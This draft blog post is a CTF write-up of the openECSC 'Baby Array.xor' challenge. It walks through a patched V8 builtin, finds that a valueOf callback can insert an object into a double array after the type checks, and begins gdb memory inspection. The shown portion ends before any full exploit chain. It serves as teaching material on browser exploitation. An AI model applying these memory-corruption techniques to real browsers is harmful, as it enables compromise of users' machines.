+++
title = 'Exploiting V8 at openECSC'
date = 2024-05-25T00:00:00Z
draft = false
tags = ['ctf','browser']
slug = "exploiting-v8-at-openecsc"
summary = "todo: fill this and also the date"
+++

**(DRAFT)**

Despite having 7 Chrome CVEs, I've never actually exploited a memory corruption in its [V8 JavaScript engine](https://v8.dev/) before. [Baby array.xor](https://github.com/ECSC2024/openECSC-2024)<!-- TODO: link -->, a challenge at this year's openECSC CTF, was my first time going from a V8 bug to popping a `/bin/sh` shell.

Most V8 exploits tend to have two sides to them - figuring out a unique way to trigger some sort of a memory corruption of at least one byte, and then following a common pattern of building upon that corruption to read arbitrary addresses (`addrof`), create fake objects (`fakeobj`), and eventually reach arbitrary code execution. This challenge was no different.

<div class="challDetails">
	<div class="challTitle challHr">Baby Array.xor</div>
	<div class="challTags">
		<span class="challTag" style="background:#007bff">6 solves</span>
		<span class="challTag" style="background:#dc3545">418 points</span>
		<span class="challTag" style="background:#ffc107;color:#000">pwn</span>
	</div>
	<div class="challSection challHr">
		<p>In case you need to xor doubles...</p>
		<code style="color:#e83e8c">nc arrayxor.challs.open.ecsc2024.it 38020</code>
	</div>
	<div class="challSection challHr">
		<div class="challSubtitle">Attachments</div>
		<details class="challFiles"><summary>array.xor.zip</summary>
			<ul><!-- TODO: links -->
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">dist/args.gn</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">dist/d8</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">dist/snapshot_blob.bin</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">docker-compose.yml</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">Dockerfile</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">README.md</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">v8.patch</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">wrapper.py</a></li>
			</ul>
		</details>
	</div>
	<div class="challSection">
		<div class="challSubtitle">Solves</div>
		<table class="challScores">
		  <thead>
		    <tr>
		      <th>#</th>
		      <th>Time</th>
		      <th>User</th>
		    </tr>
		  </thead>
		  <tbody>
		    <tr>
		      <td>1</td>
		      <td>2024-05-15 18:02:34Z</td>
		      <td>rdj</td>
		    </tr>
		    <tr>
		      <td>2</td>
		      <td>2024-05-15 18:26:26Z</td>
		      <td>Diff-fusion</td>
		    </tr>
		    <tr>
		      <td>3</td>
		      <td>2024-05-16 04:25:57Z</td>
		      <td>crazyman</td>
		    </tr>
		    <tr>
		      <td>4</td>
		      <td>2024-05-16 09:52:43Z</td>
		      <td>hlt</td>
		    </tr>
		    <tr>
		      <td>5</td>
		      <td>2024-05-17 21:35:14Z</td>
		      <td>Popax21</td>
		    </tr>
		    <tr>
		      <td>6</td>
		      <td>2024-05-19 20:43:27Z</td>
		      <td>rebane2001 <span style="font-family:'Comic Sans MS',cursive;opacity:0.2;user-select:none">&lt;- me :o</span></td>
		    </tr>
		  </tbody>
		</table>
	</div>
</div>

## Part 1: Finding the memory corruption

The challenge consists of the V8 engine with some new functionality added through a patch:

```c
/*
  Array.xor()
  let x = [0.1, 0.2, 0.3];
  x.xor(5);
*/
BUILTIN(ArrayXor) {
  HandleScope scope(isolate);
  Factory *factory = isolate->factory();
  Handle<Object> receiver = args.receiver();
  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::cast(*receiver))) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Nope")));
  }
  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
  ElementsKind kind = array->GetElementsKind();
  if (kind != PACKED_DOUBLE_ELEMENTS) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs array of double numbers")));
  }
  // Array.xor() needs exactly 1 argument
  if (args.length() != 2) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs exactly one argument")));
  }
  // Get array len
  uint32_t length = static_cast<uint32_t>(Object::Number(array->length()));
  // Get xor value
  Handle<Object> xor_val_obj;
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, xor_val_obj, Object::ToNumber(isolate, args.at(1)));
  uint64_t xor_val = static_cast<uint64_t>(Object::Number(*xor_val_obj));
  // Ah yes, xoring doubles..
  Handle<FixedDoubleArray> elements(FixedDoubleArray::cast(array->elements()), isolate);
  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i < length, i++, {
    double x = elements->get_scalar(i);
    uint64_t result = (*(uint64_t*)&x) ^ xor_val;
    elements->set(i, *(double*)&result);
  });
  
  return ReadOnlyRoots(isolate).undefined_value();
}
```

The patch adds a new **Array.xor()** prototype that can be used to xor all values within an array of doubles, let's try it:

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">0.1</span>, <span class="jsConValIn">0.2</span>, <span class="jsConValIn">0.3</span>]</div>
	<!-- <div class="jsConBorder"></div> 🢒 ► ⋖ ≻
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">0.1</span>, <span class="jsConValOut">0.2</span>, <span class="jsConValOut">0.3</span>]</i></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">3fb999999999999a</span><br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">3fc999999999999a</span><br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">3fd3333333333333</span><br/>
</div>
	</details></div> -->
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConValIn">1337</span>) <span class="jsConNull">// 0x539</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">0.10000000000001079</span>, <span class="jsConValOut">0.20000000000002158</span>, <span class="jsConValOut">0.30000000000004035</span>]</i></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x3fb9999999999<span class="jsConKw">ca3</span></span><br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x3fc9999999999<span class="jsConKw">ca3</span></span><br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x3fd3333333333<span class="jsConKw">60a</span></span><br/>
</div>
	</details></div>
</div>

<style>
.jsConsole {
	background: #282828;
	border-radius: 4px;
	width: calc(100% - 2px);
	color: #E3E3E3;
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
	font-size: 12px;
	border: 1px solid #5E5E5E;
	cursor: default;
}
.jsConsole *::selection {
	background: #004A77;
}
.jsConLine {
	min-height: 14px;
	margin: 3px;
	padding: 1px;
	width: calc(100% - 8px);
	border-radius: 4px;
}
.jsConTerm {
	white-space: pre-wrap;
	background: #000;
	color: #FFF;
	margin: 0;
	padding: 4px;
}
.jsConTerm::selection, .jsConTerm *::selection {
	color: #000;
	background: #FFF;
}
.jsConCode {
	min-height: 14px;
	margin: 3px;
	padding: 7px;
	width: calc(100% - 20px);
	border-radius: 4px;
	white-space: pre-wrap;
	cursor: initial;
}
.jsConLine:has(details) {
	text-wrap: nowrap;
}
.jsConBorder {
	background: #5E5E5E;
	width: 100%;
	height: 1px;
}
.jsConLine:hover {
	background: #3D3D3D;
}
.jsConLine:has(.jsConErr):hover {
	background: #E46962;
}
.jsConLine > details {
	padding-left: 4px;
	display: inline-block;
	text-wrap: wrap;
	max-width: calc(100% - 4px - 18px);
}
.jsConLine > details > summary::marker {
	line-height: 0;
}
.jsConVar {
	color: #C7C7C7;
}
.jsConValIn {
	color: #C4EED0;
}
.jsConValOut {
	color: #9980FF;
}
.jsConFun {
	color: #FACC15;
}
.jsConIdx {
	color: #7CACF8;
}
.jsConB {
	font-weight: bold;
}
.jsConNull {
	color: #6F6F6F;
}
.jsConKw {
	color: #BF67FF;
}
.jsConStr {
	color: #FE8D59;
}
.jsConStrOut {
	color: #5CD5FB;
}
.jsConV8 {
	/* color: #9F0; */
	color: #FFF;
}
.jsConIcon {
	fill: #C7C7C7;
	display: inline-block;
	width: 16px;
	height: 14px;
	vertical-align: top;
	padding-right: 2px;
}
.jsConErr {
	background: #4E3534;
	color: #F9DEDC;
	padding: 4px;
	border-radius: 4px;
}
.jsConErr > .jsConIcon {
	padding-right: 4px;
}

@media (width >= 430px) {
	.under430 {
		display: none;
	}
}
@media (width < 430px) {
	.over430 {
		display: none;
	}
}
@media (width < 640px) {
	.over640 {
		display: none;
	}
}
@media (width >= 640px) {
	.under640 {
		display: none;
	}
	.termCodeComm {
		float: right;
	}
}
@media (width < 800px) {
	.over800 {
		display: none;
	}
}
@media (width >= 800px) {
	.under800 {
		display: none;
	}
}
.termCode {
	white-space: pre-wrap;
	background: #000;
	color: #BBB;
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
	font-size: 12px;
	border-radius: 4px;
	width: calc(100% - 2px - 16px);
	border: 1px solid var(--lyreGold);
	padding: 8px;
	cursor: default;
}
.termCode::selection, .termCode *::selection {
	color: #000;
	background: var(--lyreGold);
}
.termCodeW {
	color: #FFF;
}
.termCodeComm {
	color: var(--lyreGold);
}
.termCodeFlag {
	display: inline-block;
	color: #FFF;
	transform: scale(1);
	text-shadow: 0 0 8px #f440;
	transition: transform 0.6s, text-shadow 0.5s, background 0.5s;
	background: linear-gradient(90deg, #fa0 0%, #f0d 50%, #80f 100%);
	font-weight: bold;
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent; 
  -moz-background-clip: text;
  -moz-text-fill-color: transparent;
  background-size: 200%;
  background-position: 100%;
  cursor: grabbing;
}
.termCodeFlag:hover {
	transform: scale(1.2);
	text-shadow: 0 0 8px #f44f;
	background-position: 0%;
}
</style>

Quite the peculiar feature. It may seem a little confusing if you aren't familiar with [IEEE 754](https://en.wikipedia.org/wiki/IEEE_754) [doubles](https://en.wikipedia.org/wiki/Double-precision_floating-point_format), but it makes sense once we look at the hex representations of the values:

<div class="jsConsole" style="text-align:center; width: fit-content; margin: 0 auto">
	<div class="jsConLine">(<span class="jsConIdx">double</span>)&nbsp;<span class="jsConValIn">0.1</span> ^ (<span class="jsConIdx">uint64</span>)&nbsp;<span class="jsConValIn">1337</span> = (<span class="jsConIdx">double</span>)&nbsp;<span class="jsConValIn">0.10000000000001079</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine" style="white-space: pre">  <span class="jsConValIn">0x3fb9999999999<span class="jsConFun">99a</span></span></div>
	<div class="jsConLine">^ <span class="jsConValIn">0x0000000000000<span class="jsConFun">539</span></span></div>
	<div class="jsConLine">= <span class="jsConValIn">0x3fb9999999999<span class="jsConFun">ca3</span></span></div>
</div>

It pretty much just interprets the double as an integer, and then performs the XOR operation on it. In this example we XORed the doubles with 0x539 (1337 in decimal), so the last three hex digits of each double changed. It's a pretty silly operation to perform on a double.

Just XORing doubles isn't going to get us anywhere though, since the values are stored in a doubles array (`PACKED_DOUBLE_ELEMENTS`[^1]) as just *raw 64-bit doubles*. All we can do is change some numbers around, but that's something we can already do without xor. It'd be a lot more interesting if we could run this xor thingie on a mixed array (`PACKED_ELEMENTS`) consisting of *memory pointers* to other JavaScript objects, because we could point the pointers to places in memory we're not supposed to.

<!-- Alright, let's see if we can break it somehow.  .To achieve memory corruption, we must somehow use this xor functionality on an array that has other kinds of elements in it . We'll see later why that is, but for now let's just try to find a way to do it. -->

Alright, let's try an array with an object in it then:

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">0.1</span>, <span class="jsConValIn">0.2</span>, {}] <span class="jsConNull">// PACKED_ELEMENTS array</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConValIn">1337</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>TypeError: Array.xor needs array of double numbers</div></div>
</div>

Hmm, seems like there's a check in-place to prevent us from doing this:

```c
  if (kind != PACKED_DOUBLE_ELEMENTS) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs array of double numbers")));
  }
```

But what if we create a double array, but then wrap it in an evil [proxy](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)?

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">0.1</span>, <span class="jsConValIn">0.2</span>, <span class="jsConValIn">0.3</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evilHandler</span> = <span style="white-space: pre-wrap">{
     <span class="jsConFun">get</span>(<span class="jsConIdx">target</span>, <span class="jsConIdx">prop</span>, <span class="jsConIdx">receiver</span>) {
       <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">`Got </span>${<span class="jsConVar">prop</span>}<span class="jsConStr">!`</span>);
       <span class="jsConKw">return</span> <span class="jsConVar">Reflect</span>.<span class="jsConFun">get</span>(...<span class="jsConVar">arguments</span>);
     }
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span> = <span class="jsConKw">new</span> <span class="jsConVar">Proxy</span>(<span class="jsConVar">arr</span>, <span class="jsConVar">evilHandler</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got constructor!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got constructor!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got length!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got 0!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got length!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got 1!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got length!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got 2!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got length!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">0.1</span>, <span class="jsConValOut">0.2</span>, <span class="jsConValOut">0.3</span>]</i> <span class="jsConNull">// hehe, looks good!</span></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">3fb999999999999a</span><br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">3fc999999999999a</span><br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">3fd3333333333333</span><br/>
</div>
	</details></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConValIn">1337</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got xor!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>TypeError: Nope</div></div>
</div>

No dice, seems like they've thought of that too:

```c
if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::cast(*receiver))) {
  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
    factory->NewStringFromAsciiChecked("Nope")));
}
```

The **IsJSArray** method makes sure that we are in fact passing an array, and the **HasOnlySimpleReceiverElements** method checks for anything sus[^2] within the array or it's prototype.

Hmmph, this seems pretty well coded so far. There is no way for us to get anything other than a basic double array past these checks, and XORing such an array isn't going to accomplish anything. I went on to carefully examine other parts of the code for any possible flaws.

The length of the array gets stored in a `uint32_t`, and I thought that perhaps we could overflow this value, but it turns out you can't make an array that big:

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = <span class="jsConKw">new</span> <span class="jsConVar">Array</span>(<span class="jsConValIn">2</span>**<span class="jsConValIn">32</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>RangeError: Invalid array length</div></div>
</div>

I also tried messing with the length value, but v8 doesn't allow us to do that in a way that could be of use here:

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>, <span class="jsConValIn">3.3</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">length</span> = <span class="jsConStr">"evil"</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>RangeError: Invalid array length</div></div>
  <div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">__defineGetter__</span>(<span class="jsConStr">"length"</span>, () => <span class="jsConValIn">1337</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>TypeError: Cannot redefine property: length</div></div>
  <div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">length</span> = <span class="jsConValIn">1337</span> <span class="jsConNull">// uh oh, our array is now a HOLEY_DOUBLE_ELEMENTS</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConValIn">1337</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>TypeError: Array.xor needs array of double numbers</div></div>
</div>

And then it hit me - we're only doing all those fancy checks on the array itself, but not the argument! We get the xor argument (`Object::ToNumber(isolate, args.at(1))`) *after* we're already past all the previous array checks, so perhaps we could turn the xor argument evil and put an object in the double array once we're already past the initial checks? Let's give it a shot:

<div class="jsConsole">
		<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>, <span class="jsConValIn">3.3</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span> = {<span style="white-space: pre-wrap">
     <span class="jsConFun">valueOf</span>: () => {
       <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {};
       <span class="jsConKw">return</span> <span class="jsConValIn">1337</span>;
     }
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">evil</span>) <span class="jsConNull">// our array turns into PACKED_ELEMENTS here!</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">140508</span>, <span class="jsConValOut">2.2</span>, <span class="jsConValOut">140484</span>]</i> <span class="jsConNull">// waow!</span></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x000449b8</span> (<span class="jsConIdx">SMI</span>)<br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x00044cbd</span> (<span class="jsConIdx">pointer to double</span>)<br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x00044988</span> (<span class="jsConIdx">SMI</span>)<br/>
</div>
	</details></div>
</div>

We're cooking! <!-- todo: maybe change -->

## Part 2: Breaking out of bounds

Now that we've found a way to put some objects in an array and mess with their pointer, we must figure out a way to turn them into primitives we can actually use. There are a few different ways to accomplish this from here. I'll go with the path I took originally, but see if you can figure out any other ways to get there - I'll share a couple (arguably better ones) at the end of the post.

But first, we should look at how v8 stores stuff in the memory so that we can figure out what our memory corruption looks like and what we can do with it. How could we do that?

With the **d8 natives syntax** and a **debugger**! If we launch d8 (the v8 shell) with the `--allow-natives-syntax` flag, we can use various debug functions such as `%DebugPrint(obj)` to examine what's going on with objects, and if we combine that with a debugger ([gdb](https://gnu.org/software/gdb/) in this case) we can even check out the entire memory to understand it better. Let's try it:

<div class="termCode"><span class="termCodeW">$ gdb --args ./d8 --allow-natives-syntax</span> <span class="termCodeComm">&lt;-- use d8 with the natives syntax in gdb</span>
GNU gdb (GDB) 14.2
<span class="termCodeW">(gdb) run</span> <span class="termCodeComm">&lt;-- start d8</span>
Starting program: /home/lyra/Desktop/array.xor/dist/d8 --allow-natives-syntax
V8 version 12.7.0 (candidate)
<span class="termCodeW">d8&gt; arr = [1.1, 2.2, 3.3]</span> <span class="termCodeComm">&lt;-- create an array</span>
[1.1, 2.2, 3.3]
<span class="termCodeW">d8&gt; %DebugPrint(arr)</span> <span class="termCodeComm">&lt;-- debugprint the array</span>
DebugPrint: <span class="termCodeW">0xa3800042be9</span>: [JSArray] <span class="termCodeComm">&lt;-- we get the address here</span>
 - map: 0x0a38001cb7c5 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x0a38001cb11d &lt;JSArray[0]&gt;
 - elements: 0x0a3800042bc9 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x0a3800000725 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0xa3800000d99: [String] in ReadOnlySpace: #length: 0x0a3800025f85 &lt;AccessorInfo name= 0x0a3800000d99 &lt;String[6]: #length&gt;, data= 0x0a3800000069 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x0a3800042bc9 &lt;FixedDoubleArray[3]&gt; {
           0: 1.1
           1: 2.2
           2: 3.3
 }
0xa38001cb7c5: [Map] in OldSpace
 - map: 0x0a38001c01b5 &lt;MetaMap (0x0a38001c0205 &lt;NativeContext[295]&gt;)&gt;
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - enum length: invalid
 - back pointer: 0x0a38001cb785 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt;
 - prototype_validity cell: 0x0a3800000a89 &lt;Cell value= 1&gt;
 - instance descriptors #1: 0x0a38001cb751 &lt;DescriptorArray[1]&gt;
 - transitions #1: 0x0a38001cb7ed &lt;TransitionArray[4]&gt;
   Transition array #1:
     0x0a3800000e5d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x0a38001cb805 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;
 - prototype: 0x0a38001cb11d &lt;JSArray[0]&gt;
